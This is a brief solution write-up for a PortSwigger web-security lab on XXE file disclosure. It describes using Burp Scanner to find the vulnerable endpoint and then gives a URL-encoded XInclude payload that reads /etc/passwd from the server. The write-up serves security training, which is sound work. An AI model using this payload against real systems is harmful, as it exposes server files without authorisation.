

### Lab description

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of `/etc/passwd` within 10 minutes.

Due to the tight time limit, we recommend using [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner) to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a [targeted scan on a specific request](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request). Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

* Hint
> If you get stuck, try looking up our Academy topic on the identified vulnerability class.

### Solution

* Do active scan using Burp to find the XXE vulnerable endpoint

![](/static/img/Pasted_image_20230527115426.png)

* Burp will find the vulnerable endpoint

![](/static/img/Pasted_image_20230527115506.png)

* Using the payload below to solve the lab

```xml
<foo%20xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include%20parse="text"%20href="file:///etc/passwd"/></foo>
```

* Lab solved!

![](/static/img/Pasted_image_20230527115401.png)